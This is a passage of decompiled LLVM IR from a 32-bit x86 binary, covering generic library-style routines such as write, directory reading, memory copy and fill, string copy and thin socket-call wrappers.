dec_label_pc_805127a:                             ; preds = %dec_label_pc_8051252, %dec_label_pc_805126e
  %v2_805127e = phi i32 [ %v0_8051252, %dec_label_pc_8051252 ], [ %v2_805127e.pre, %dec_label_pc_805126e ]
  %v0_805127a = phi i32 [ %v3_8051262, %dec_label_pc_8051252 ], [ -1, %dec_label_pc_805126e ]
  store i32 %v2_805127e, i32* %edi.global-to-local, align 4
  ret i32 %v0_805127a

; uselistorder directives
  uselistorder i32 %v3_8051262, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805127a, { 1, 0 }
}

define i32 @function_8051280(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051280:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051280 = load i32, i32* @edi, align 4
  store i32 %v0_8051280, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8051290 = load i32, i32* @ebx, align 4
  %v4_8051298 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8051298, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8051298, -4095
  br i1 %tmp12, label %dec_label_pc_80512b0, label %dec_label_pc_80512a4

dec_label_pc_80512a4:                             ; preds = %dec_label_pc_8051280
  %v1_80512a4 = call i32 @function_805149b(i32 %v0_8051290)
  %v0_80512a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_80512a9 = sub i32 0, %v0_80512a9
  %v2_80512ab = inttoptr i32 %v1_80512a4 to i32*
  store i32 %v1_80512a9, i32* %v2_80512ab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_80512b4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80512b0

dec_label_pc_80512b0:                             ; preds = %dec_label_pc_8051280, %dec_label_pc_80512a4
  %v2_80512b4 = phi i32 [ %v0_8051280, %dec_label_pc_8051280 ], [ %v2_80512b4.pre, %dec_label_pc_80512a4 ]
  %v0_80512b0 = phi i32 [ %v4_8051298, %dec_label_pc_8051280 ], [ -1, %dec_label_pc_80512a4 ]
  store i32 %v2_80512b4, i32* %edi.global-to-local, align 4
  ret i32 %v0_80512b0

; uselistorder directives
  uselistorder i32 %v4_8051298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80512b0, { 1, 0 }
}

define i32 @function_80512b6(i32* %arg1) local_unnamed_addr {
dec_label_pc_80512b6:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v0_80512b8 = load i32, i32* @ebx, align 4
  %v12_80512b9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp3, i32* @edi, align 4
  %v2_80512c0 = load i32, i32* %arg1, align 4
  %v12_80512c0 = icmp eq i32 %v2_80512c0, -1
  %v1_80512c3 = icmp eq i1 %v12_80512c0, false
  br i1 %v1_80512c3, label %dec_label_pc_80512d5, label %dec_label_pc_80512c5

dec_label_pc_80512c5:                             ; preds = %dec_label_pc_80512b6
  %v1_80512c5 = call i32 @function_805149b(i32 %v0_80512b8)
  %v1_80512ca = inttoptr i32 %v1_80512c5 to i32*
  store i32 9, i32* %v1_80512ca, align 4
  br label %dec_label_pc_805131f

dec_label_pc_80512d5:                             ; preds = %dec_label_pc_80512b6
  %v1_80512d5 = add i32 %tmp3, 24
  store i32 %v12_80512b9, i32* @esi, align 4
  %v2_80512e4 = call i32 @function_8052dfa(i32 %v12_80512b9, i32 134557175)
  %v1_80512ec = call i32 @function_8052df7(i32 %v1_80512d5)
  store i32 %v1_80512ec, i32* @eax, align 4
  %v0_80512f1 = load i32, i32* @edi, align 4
  %v1_80512f1 = inttoptr i32 %v0_80512f1 to i32*
  %v2_80512f1 = load i32, i32* %v1_80512f1, align 4
  store i32 %v2_80512f1, i32* @ebx, align 4
  store i32 -1, i32* %v1_80512f1, align 4
  %v2_80512fe = call i32 @function_8052dfa(i32 %v12_80512b9, i32 1)
  %v0_8051304 = load i32, i32* @edi, align 4
  %v1_8051304 = add i32 %v0_8051304, 12
  %v2_8051304 = inttoptr i32 %v1_8051304 to i32*
  %v3_8051304 = load i32, i32* %v2_8051304, align 4
  %v1_8051307 = call i32 @function_8052693(i32 %v3_8051304)
  %v0_805130c = load i32, i32* @edi, align 4
  %v1_805130f = call i32 @function_8052693(i32 %v0_805130c)
  %v0_8051314 = load i32, i32* @ebx, align 4
  %v1_8051317 = call i32 @function_8050f63(i32 %v0_8051314)
  br label %dec_label_pc_805131f

dec_label_pc_805131f:                             ; preds = %dec_label_pc_80512c5, %dec_label_pc_80512d5
  %v0_8051325 = phi i32 [ -1, %dec_label_pc_80512c5 ], [ %v1_8051317, %dec_label_pc_80512d5 ]
  ret i32 %v0_8051325

; uselistorder directives
  uselistorder label %dec_label_pc_805131f, { 1, 0 }
}

define i32 @function_8051326(i32 %arg1) local_unnamed_addr {
dec_label_pc_8051326:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8051337 = inttoptr i32 %arg1 to i8*
  %v3_8051337 = call i32 @function_8051074(i8* %v2_8051337, i32 67584)
  store i32 %v3_8051337, i32* %eax.global-to-local, align 4
  store i32 %v3_8051337, i32* @edi, align 4
  %v2_8051341 = icmp slt i32 %v3_8051337, 0
  br i1 %v2_8051341, label %dec_label_pc_805140e, label %dec_label_pc_8051349

dec_label_pc_8051349:                             ; preds = %dec_label_pc_8051326
  %v0_8051349 = load i32, i32* @ebx, align 4
  %v2_805134b = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_805134b, i32* %eax.global-to-local, align 4
  store i32 %v3_8051337, i32* %stack_var_-124, align 4
  %v4_8051351 = call i32 @function_80531f2(i32 %v3_8051337, i32 %v2_805134b, i32 %v0_8051349, i32 %v0_8051349)
  store i32 %v4_8051351, i32* %eax.global-to-local, align 4
  %v2_8051359 = icmp slt i32 %v4_8051351, 0
  br i1 %v2_8051359, label %dec_label_pc_805136f, label %dec_label_pc_805135d

dec_label_pc_805135d:                             ; preds = %dec_label_pc_8051349
  %v0_8051362 = load i32, i32* @edi, align 4
  store i32 %v0_8051362, i32* %stack_var_-124, align 4
  %v3_8051363 = call i32 @function_8050ecd(i32 %v0_8051362, i32 2, i32 1)
  store i32 %v3_8051363, i32* %eax.global-to-local, align 4
  %v2_805136b = icmp slt i32 %v3_8051363, 0
  %v1_805136d = icmp eq i1 %v2_805136b, false
  br i1 %v1_805136d, label %dec_label_pc_8051385, label %dec_label_pc_805136f

dec_label_pc_805136f:                             ; preds = %dec_label_pc_805135d, %dec_label_pc_8051349
  %v0_805136f = load i32, i32* %stack_var_-124, align 4
  %v1_805136f = call i32 @function_805149b(i32 %v0_805136f)
  store i32 %v1_805136f, i32* %eax.global-to-local, align 4
  store i32 %v1_805136f, i32* @ebx, align 4
  %v1_8051379 = inttoptr i32 %v1_805136f to i32*
  %v2_8051379 = load i32, i32* %v1_8051379, align 4
  %v0_805137b = load i32, i32* @edi, align 4
  store i32 %v0_805137b, i32* %stack_var_-124, align 4
  %v1_805137c = call i32 @function_8050f63(i32 %v0_805137b)
  store i32 %v1_805137c, i32* %eax.global-to-local, align 4
  %v1_8051381 = load i32, i32* @ebx, align 4
  %v2_8051381 = inttoptr i32 %v1_8051381 to i32*
  store i32 %v2_8051379, i32* %v2_8051381, align 4
  br label %dec_label_pc_80513fa

dec_label_pc_8051385:                             ; preds = %dec_label_pc_805135d
  store i32 48, i32* %stack_var_-124, align 4
  %v1_805138a = call i32 @function_80518ce(i32 48)
  store i32 %v1_805138a, i32* %eax.global-to-local, align 4
  store i32 %v1_805138a, i32* @ebx, align 4
  %v1_8051394 = icmp eq i32 %v1_805138a, 0
  br i1 %v1_8051394, label %dec_label_pc_80513e6, label %dec_label_pc_8051398

dec_label_pc_8051398:                             ; preds = %dec_label_pc_8051385
  %v0_8051398 = load i32, i32* @edi, align 4
  %v2_8051398 = inttoptr i32 %v1_805138a to i32*
  store i32 %v0_8051398, i32* %v2_8051398, align 4
  %v1_805139a = add i32 %v1_805138a, 16
  %v2_805139a = inttoptr i32 %v1_805139a to i32*
  store i32 0, i32* %v2_805139a, align 4
  %v1_80513a1 = add i32 %v1_805138a, 8
  %v2_80513a1 = inttoptr i32 %v1_80513a1 to i32*
  store i32 0, i32* %v2_80513a1, align 4
  %v1_80513a8 = add i32 %v1_805138a, 4
  %v2_80513a8 = inttoptr i32 %v1_80513a8 to i32*
  store i32 0, i32* %v2_80513a8, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_80513b3 = load i32, i32* @ebx, align 4
  %v2_80513b3 = add i32 %v1_80513b3, 20
  %v3_80513b3 = inttoptr i32 %v2_80513b3 to i32*
  store i32 %tmp, i32* %v3_80513b3, align 4
  %v0_80513b6 = load i32, i32* %eax.global-to-local, align 4
  %v6_80513bb = icmp ugt i32 %v0_80513b6, 511
  br i1 %v6_80513bb, label %dec_label_pc_80513c4, label %dec_label_pc_80513bd

dec_label_pc_80513bd:                             ; preds = %dec_label_pc_8051398
  %v0_80513bd = load i32, i32* @ebx, align 4
  %v1_80513bd = add i32 %v0_80513bd, 20
  %v2_80513bd = inttoptr i32 %v1_80513bd to i32*
  store i32 512, i32* %v2_80513bd, align 4
  br label %dec_label_pc_80513c4

dec_label_pc_80513c4:                             ; preds = %dec_label_pc_8051398, %dec_label_pc_80513bd
  %v0_80513c4 = load i32, i32* @edx, align 4
  %v0_80513c6 = load i32, i32* @ebx, align 4
  %v1_80513c6 = add i32 %v0_80513c6, 20
  %v2_80513c6 = inttoptr i32 %v1_80513c6 to i32*
  %v3_80513c6 = load i32, i32* %v2_80513c6, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v5_80513cb = call i32 @function_8052042(i64 1, i32 %v3_80513c6, i32 %v0_80513c4, i32 %v0_80513c4)
  store i32 %v5_80513cb, i32* %eax.global-to-local, align 4
  %v1_80513d3 = load i32, i32* @ebx, align 4
  %v2_80513d3 = add i32 %v1_80513d3, 12
  %v3_80513d3 = inttoptr i32 %v2_80513d3 to i32*
  store i32 %v5_80513cb, i32* %v3_80513d3, align 4
  %v1_80513d6 = icmp eq i32 %v5_80513cb, 0
  %v1_80513d8 = icmp eq i1 %v1_80513d6, false
  br i1 %v1_80513d8, label %dec_label_pc_80513fe, label %dec_label_pc_80513da

dec_label_pc_80513da:                             ; preds = %dec_label_pc_80513c4
  %v0_80513dd = load i32, i32* @ebx, align 4
  store i32 %v0_80513dd, i32* %stack_var_-124, align 4
  %v1_80513de = call i32 @function_8052693(i32 %v0_80513dd)
  store i32 %v1_80513de, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513e6

dec_label_pc_80513e6:                             ; preds = %dec_label_pc_8051385, %dec_label_pc_80513da
  %v0_80513e9 = load i32, i32* @edi, align 4
  store i32 %v0_80513e9, i32* %stack_var_-124, align 4
  %v1_80513ea = call i32 @function_8050f63(i32 %v0_80513e9)
  store i32 %v1_80513ea, i32* %eax.global-to-local, align 4
  %v1_80513ef = call i32 @function_805149b(i32 %v0_80513e9)
  store i32 %v1_80513ef, i32* %eax.global-to-local, align 4
  %v1_80513f4 = inttoptr i32 %v1_80513ef to i32*
  store i32 12, i32* %v1_80513f4, align 4
  br label %dec_label_pc_80513fa

dec_label_pc_80513fa:                             ; preds = %dec_label_pc_805136f, %dec_label_pc_80513e6
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805140b

dec_label_pc_80513fe:                             ; preds = %dec_label_pc_80513c4
  %v0_8051400 = load i32, i32* @ebx, align 4
  %v1_8051400 = add i32 %v0_8051400, 24
  store i32 %v1_8051400, i32* %eax.global-to-local, align 4
  store i32 %v1_8051400, i32* %stack_var_-124, align 4
  %v1_8051406 = call i32 @function_8052df7(i32 %v1_8051400)
  store i32 %v1_8051406, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805140b

dec_label_pc_805140b:                             ; preds = %dec_label_pc_80513fa, %dec_label_pc_80513fe
  br label %dec_label_pc_805140e

dec_label_pc_805140e:                             ; preds = %dec_label_pc_8051326, %dec_label_pc_805140b
  %v0_8051411 = load i32, i32* @ebx, align 4
  store i32 %v0_8051411, i32* %eax.global-to-local, align 4
  ret i32 %v0_8051411

; uselistorder directives
  uselistorder i32 %v1_805138a, { 3, 0, 1, 2, 5, 4, 6 }
  uselistorder i32 %v1_805136f, { 1, 0, 2 }
  uselistorder i32 %v3_8051337, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32)* @function_8050f63, { 11, 10, 9, 8, 7, 6, 3, 5, 2, 4, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805140e, { 1, 0 }
  uselistorder label %dec_label_pc_805140b, { 1, 0 }
  uselistorder label %dec_label_pc_80513fa, { 1, 0 }
  uselistorder label %dec_label_pc_80513e6, { 1, 0 }
  uselistorder label %dec_label_pc_80513c4, { 1, 0 }
}

define i32 @function_8051417(i32* %arg1) local_unnamed_addr {
dec_label_pc_8051417:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %tmp3, i32* @esi, align 4
  %v1_8051420 = add i32 %tmp3, 24
  store i32 %v1_8051420, i32* @ebx, align 4
  %v2_8051429 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051429, i32* @eax, align 4
  %v2_805142e = call i32 @function_8052dfa(i32 %v2_8051429, i32 134557175)
  %v0_8051433 = load i32, i32* @ebx, align 4
  %v1_8051436 = call i32 @function_8052df7(i32 %v0_8051433)
  br label %dec_label_pc_805143e

dec_label_pc_805143e:                             ; preds = %dec_label_pc_8051469, %dec_label_pc_8051417
  %v0_805143e = load i32, i32* @esi, align 4
  %v1_805143e = add i32 %v0_805143e, 8
  %v2_805143e = inttoptr i32 %v1_805143e to i32*
  %v3_805143e = load i32, i32* %v2_805143e, align 4
  %v2_8051441 = add i32 %v0_805143e, 4
  %v3_8051441 = inttoptr i32 %v2_8051441 to i32*
  %v4_8051441 = load i32, i32* %v3_8051441, align 4
  %v6_8051444 = icmp ugt i32 %v3_805143e, %v4_8051441
  br i1 %v6_8051444, label %dec_label_pc_8051469, label %dec_label_pc_8051446

dec_label_pc_8051446:                             ; preds = %dec_label_pc_805143e
  %v0_8051446 = load i32, i32* @edx, align 4
  %v1_8051447 = add i32 %v0_805143e, 20
  %v2_8051447 = inttoptr i32 %v1_8051447 to i32*
  %v3_8051447 = load i32, i32* %v2_8051447, align 4
  %v1_805144a = add i32 %v0_805143e, 12
  %v2_805144a = inttoptr i32 %v1_805144a to i32*
  %v3_805144a = load i32, i32* %v2_805144a, align 4
  %v1_805144d = inttoptr i32 %v0_805143e to i32*
  %v2_805144d = load i32, i32* %v1_805144d, align 4
  %v4_805144f = call i32 @function_805323a(i32 %v2_805144d, i32 %v3_805144a, i32 %v3_8051447, i32 %v0_8051446)
  %tmp13 = icmp slt i32 %v4_805144f, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_805145f, label %dec_label_pc_805145b

dec_label_pc_805145b:                             ; preds = %dec_label_pc_8051446
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051485

dec_label_pc_805145f:                             ; preds = %dec_label_pc_8051446
  %v1_805145f = load i32, i32* @esi, align 4
  %v2_805145f = add i32 %v1_805145f, 8
  %v3_805145f = inttoptr i32 %v2_805145f to i32*
  store i32 %v4_805144f, i32* %v3_805145f, align 4
  %v0_8051462 = load i32, i32* @esi, align 4
  %v1_8051462 = add i32 %v0_8051462, 4
  %v2_8051462 = inttoptr i32 %v1_8051462 to i32*
  store i32 0, i32* %v2_8051462, align 4
  %v0_8051469.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051469

dec_label_pc_8051469:                             ; preds = %dec_label_pc_805143e, %dec_label_pc_805145f
  %v1_8051477 = phi i32 [ %v0_805143e, %dec_label_pc_805143e ], [ %v0_8051469.pre, %dec_label_pc_805145f ]
  %v1_8051469 = add i32 %v1_8051477, 4
  %v2_8051469 = inttoptr i32 %v1_8051469 to i32*
  %v3_8051469 = load i32, i32* %v2_8051469, align 4
  %v2_805146e = add i32 %v1_8051477, 12
  %v3_805146e = inttoptr i32 %v2_805146e to i32*
  %v4_805146e = load i32, i32* %v3_805146e, align 4
  %v5_805146e = add i32 %v4_805146e, %v3_8051469
  store i32 %v5_805146e, i32* @ebx, align 4
  %v1_8051471 = add i32 %v5_805146e, 8
  %v2_8051471 = inttoptr i32 %v1_8051471 to i16*
  %v3_8051471 = load i16, i16* %v2_8051471, align 2
  %v4_8051471 = zext i16 %v3_8051471 to i32
  store i32 %v4_8051471, i32* @edx, align 4
  %v2_8051475 = add i32 %v4_8051471, %v3_8051469
  store i32 %v2_8051475, i32* %v2_8051469, align 4
  %v0_805147a = load i32, i32* @ebx, align 4
  %v1_805147a = add i32 %v0_805147a, 4
  %v2_805147a = inttoptr i32 %v1_805147a to i32*
  %v3_805147a = load i32, i32* %v2_805147a, align 4
  %v1_805147d = load i32, i32* @esi, align 4
  %v2_805147d = add i32 %v1_805147d, 16
  %v3_805147d = inttoptr i32 %v2_805147d to i32*
  store i32 %v3_805147a, i32* %v3_805147d, align 4
  %v0_8051480 = load i32, i32* @ebx, align 4
  %v1_8051480 = inttoptr i32 %v0_8051480 to i32*
  %v2_8051480 = load i32, i32* %v1_8051480, align 4
  %v3_8051480 = icmp eq i32 %v2_8051480, 0
  br i1 %v3_8051480, label %dec_label_pc_805143e, label %dec_label_pc_8051485.loopexit

dec_label_pc_8051485.loopexit:                    ; preds = %dec_label_pc_8051469
  br label %dec_label_pc_8051485

dec_label_pc_8051485:                             ; preds = %dec_label_pc_8051485.loopexit, %dec_label_pc_805145b
  store i32 %v2_8051429, i32* @eax, align 4
  %v2_805148e = call i32 @function_8052dfa(i32 %v2_8051429, i32 1)
  %v0_8051493 = load i32, i32* @ebx, align 4
  ret i32 %v0_8051493

; uselistorder directives
  uselistorder i32 %v1_8051477, { 1, 0 }
  uselistorder i32 %v0_805143e, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder label %dec_label_pc_8051469, { 1, 0 }
}

define i32 @function_805149b(i32 %arg1) local_unnamed_addr {
dec_label_pc_805149b:
  ret i32 ptrtoint (i32* @global_var_8055154.29 to i32)
}

define i32 @function_80514a1() local_unnamed_addr {
dec_label_pc_80514a1:
  %tmp = call i64 @__decompiler_undefined_function_6()
  %stack_var_-16 = alloca i32, align 4
  %v1_80514a9 = bitcast i32* %stack_var_-16 to %tms*
  %v2_80514a9 = call i32 @function_805360f(%tms* %v1_80514a9)
  %v4_80514ae = trunc i64 %tmp to i32
  %v4_80514b2 = load i32, i32* %stack_var_-16, align 4
  %v5_80514b2 = add i32 %v4_80514b2, %v4_80514ae
  %v3_80514b9 = mul i32 %v5_80514b2, 10000
  %v1_80514bf = and i32 %v3_80514b9, 2147483632
  ret i32 %v1_80514bf

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_80514c5(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80514c5:
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80514c6 = load i32, i32* @esi, align 4
  store i32 %v0_80514c6, i32* %stack_var_-8, align 4
  %v4_80514c7 = ptrtoint i8* %arg1 to i32
  %v9_80514d3 = icmp ugt i8* %tmp3, %arg1
  %v1_80514d5 = icmp eq i1 %v9_80514d3, false
  br i1 %v1_80514d5, label %dec_label_pc_80514dd, label %dec_label_pc_80514d7

dec_label_pc_80514d7:                             ; preds = %dec_label_pc_80514c5
  %v7_80514d9 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %arg3)
  br label %dec_label_pc_80514e9

dec_label_pc_80514dd:                             ; preds = %dec_label_pc_80514c5
  %v3_80514dd = add i32 %arg2, -1
  %v4_80514dd = add i32 %v3_80514dd, %arg3
  %v5_80514dd = inttoptr i32 %v4_80514dd to i8*
  %v3_80514e1 = add i32 %v4_80514c7, -1
  %v4_80514e1 = add i32 %v3_80514e1, %arg3
  %v5_80514e1 = inttoptr i32 %v4_80514e1 to i8*
  %v7_80514e6 = call i8* @_memcpy(i8* %v5_80514e1, i8* %v5_80514dd, i32 %arg3)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_80514e9

dec_label_pc_80514e9:                             ; preds = %dec_label_pc_80514d7, %dec_label_pc_80514dd
  %v2_80514e9 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80514e9, i32* @esi, align 4
  ret i32 %v4_80514c7

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80514e9, { 1, 0 }
}

define i32 @function_80514ec(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80514ec:
  %v0_80514ec = load i32, i32* @edi, align 4
  %v4_80514f5 = ptrtoint i8* %arg1 to i32
  %v5_80514f9 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_80514ec, i32* @edi, align 4
  ret i32 %v4_80514f5

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_8051501(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051501:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051502 = load i32, i32* @esi, align 4
  store i32 %v0_8051502, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805150a = ptrtoint i8* %arg1 to i32
  store i32 %v4_805150a, i32* %edi.global-to-local, align 4
  %v4_805150e.pre = load i32, i32* @eax, align 4
  %v8_805150e.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805150e

dec_label_pc_805150e:                             ; preds = %dec_label_pc_805150e.dec_label_pc_805150e_crit_edge, %dec_label_pc_8051501
  %v2_805150f = phi i32 [ %v7_805150f, %dec_label_pc_805150e.dec_label_pc_805150e_crit_edge ], [ %v4_805150a, %dec_label_pc_8051501 ]
  %v8_805150e = phi i1 [ %v5_805150f, %dec_label_pc_805150e.dec_label_pc_805150e_crit_edge ], [ %v8_805150e.pre, %dec_label_pc_8051501 ]
  %v4_805150e = phi i32 [ %v0_8051510, %dec_label_pc_805150e.dec_label_pc_805150e_crit_edge ], [ %v4_805150e.pre, %dec_label_pc_8051501 ]
  %v7_805150e = phi i32 [ %v0_805150e.pre, %dec_label_pc_805150e.dec_label_pc_805150e_crit_edge ], [ %arg2, %dec_label_pc_8051501 ]
  %v1_805150e = inttoptr i32 %v7_805150e to i8*
  %v2_805150e = load i8, i8* %v1_805150e, align 1
  %v3_805150e = zext i8 %v2_805150e to i32
  %v5_805150e = and i32 %v4_805150e, -256
  %v6_805150e = or i32 %v3_805150e, %v5_805150e
  store i32 %v6_805150e, i32* %eax.global-to-local, align 4
  %v9_805150e = select i1 %v8_805150e, i32 -1, i32 1
  %v10_805150e = add i32 %v7_805150e, %v9_805150e
  store i32 %v10_805150e, i32* %esi.global-to-local, align 4
  %v3_805150f = inttoptr i32 %v2_805150f to i8*
  store i8 %v2_805150e, i8* %v3_805150f, align 1
  %v4_805150f = load i32, i32* %edi.global-to-local, align 4
  %v5_805150f = load i1, i1* @df, align 1
  %v6_805150f = select i1 %v5_805150f, i32 -1, i32 1
  %v7_805150f = add i32 %v6_805150f, %v4_805150f
  store i32 %v7_805150f, i32* %edi.global-to-local, align 4
  %v0_8051510 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051510 = trunc i32 %v0_8051510 to i8
  %v4_8051510 = icmp eq i8 %v3_8051510, 0
  %v1_8051512 = icmp eq i1 %v4_8051510, false
  br i1 %v1_8051512, label %dec_label_pc_805150e.dec_label_pc_805150e_crit_edge, label %dec_label_pc_8051514

dec_label_pc_805150e.dec_label_pc_805150e_crit_edge: ; preds = %dec_label_pc_805150e
  %v0_805150e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805150e

dec_label_pc_8051514:                             ; preds = %dec_label_pc_805150e
  store i32 %v4_805150a, i32* %eax.global-to-local, align 4
  %v2_8051519 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051519, i32* %esi.global-to-local, align 4
  ret i32 %v4_805150a

; uselistorder directives
  uselistorder i32 %v0_8051510, { 1, 0 }
  uselistorder i32 %v7_805150f, { 1, 0 }
  uselistorder i1 %v5_805150f, { 1, 0 }
  uselistorder i32 %v4_805150a, { 1, 2, 0, 3 }
}

define i32 @function_805151c() local_unnamed_addr {
dec_label_pc_805151c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v2_805151f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8051528 = inttoptr i32 %tmp to i8*
  %v3_8051528 = call i32 @function_80536e1(i8* %v2_8051528, i32 %v2_805151f)
  %v1_8051533 = icmp eq i32 %v3_8051528, 0
  br i1 %v1_8051533, label %dec_label_pc_805153b, label %dec_label_pc_8051537

dec_label_pc_8051537:                             ; preds = %dec_label_pc_805151c
  %v3_8051537 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805153b

dec_label_pc_805153b:                             ; preds = %dec_label_pc_805151c, %dec_label_pc_8051537
  %v0_805153b = phi i32 [ -1, %dec_label_pc_805151c ], [ %v3_8051537, %dec_label_pc_8051537 ]
  ret i32 %v0_805153b

; uselistorder directives
  uselistorder label %dec_label_pc_805153b, { 1, 0 }
}

define i32 @function_8051541(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051541:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805155c = ptrtoint i32* %stack_var_-12 to i32
  %v2_8051563 = call i32 @function_805312b(i32 2, i32 %v2_805155c)
  ret i32 %v2_8051563

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_805156c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805156c:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8051587 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805158e = call i32 @function_805312b(i32 3, i32 %v2_8051587)
  ret i32 %v2_805158e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_8051597(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051597:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80515b2 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80515b9 = call i32 @function_805312b(i32 6, i32 %v2_80515b2)
  ret i32 %v2_80515b9

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_80515c2() local_unnamed_addr {
dec_label_pc_80515c2:
  %stack_var_-20 = alloca i32, align 4
  %v2_80515ed = ptrtoint i32* %stack_var_-20 to i32
  %v2_80515f4 = call i32 @function_805312b(i32 15, i32 %v2_80515ed)
  ret i32 %v2_80515f4
}

define i32 @function_80515fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80515fd:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_8051610 = ptrtoint i32* %stack_var_-8 to i32
  %v2_8051617 = call i32 @function_805312b(i32 4, i32 %v2_8051610)
  ret i32 %v2_8051617

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_8051620() local_unnamed_addr {
dec_label_pc_8051620:
  %stack_var_-16 = alloca i32, align 4
  %v2_8051643 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805164a = call i32 @function_805312b(i32 10, i32 %v2_8051643)
  ret i32 %v2_805164a
}

define i32 @function_8051653() local_unnamed_addr {
dec_label_pc_8051653:
  %stack_var_-24 = alloca i32, align 4
  %v2_8051686 = ptrtoint i32* %stack_var_-24 to i32
  %v2_805168d = call i32 @function_805312b(i32 12, i32 %v2_8051686)
  ret i32 %v2_805168d
}

define i32 @function_8051696() local_unnamed_addr {
dec_label_pc_8051696:
  %stack_var_-16 = alloca i32, align 4
  %v2_80516b9 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80516c0 = call i32 @function_805312b(i32 9, i32 %v2_80516b9)
  ret i32 %v2_80516c0
}

define i32 @function_80516c9() local_unnamed_addr {
dec_label_pc_80516c9:
  %stack_var_-24 = alloca i32, align 4
  %v2_80516fc = ptrtoint i32* %stack_var_-24 to i32
  %v2_8051703 = call i32 @function_805312b(i32 11, i32 %v2_80516fc)
  ret i32 %v2_8051703
}

define i32 @function_805170c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_805170c:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8051737 = ptrtoint i32* %stack_var_-20 to i32
